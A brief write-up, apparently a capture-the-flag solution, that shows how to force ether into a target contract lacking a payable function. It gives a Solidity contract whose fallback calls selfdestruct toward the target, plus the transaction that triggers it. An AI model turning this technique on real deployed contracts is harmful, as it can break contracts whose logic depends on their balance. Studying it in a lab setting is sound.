one way to hack this and send eth is to `selfdestruct` another contract holding some eth with the address of the target contract [1].

```
pragma solidity ^0.8.0;

contract HackForce {
    fallback() external payable {
        address payable instance = payable(<instance address>);
        selfdestruct(instance);
    }
}
```

Then call this contract with some value:


```
sendTransaction({from: player, to: '<contract address>', value: 1})
```

[1] https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988
